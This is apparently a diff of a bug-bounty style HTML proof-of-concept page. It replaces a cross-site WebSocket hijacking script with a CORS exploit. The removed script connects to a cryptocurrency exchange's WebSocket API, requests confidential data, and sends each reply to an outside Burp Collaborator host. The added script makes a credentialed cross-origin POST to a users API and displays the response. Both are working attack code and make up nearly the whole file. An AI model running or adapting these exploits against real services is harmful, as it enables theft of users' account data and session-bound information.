@@ -1,12 +1,25 @@
-   <script>
-websocket = new WebSocket('wss://legacy.deribit.com/ws/api/v2/')
-websocket.onopen = start
-websocket.onmessage = handleReply
-function start(event) {
-  websocket.send("READY"); //Send the message to retreive confidential information
-}
-function handleReply(event) {
-  //Exfiltrate the confidential information to attackers server
-  fetch('https://gh1yff350z98mr84muekzkxvym4cs1.burpcollaborator.net/?'+event.data, {mode: 'no-cors'})
-}
-</script>
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("emo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("POST", "https://elements/api-v2/signup/users/all", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
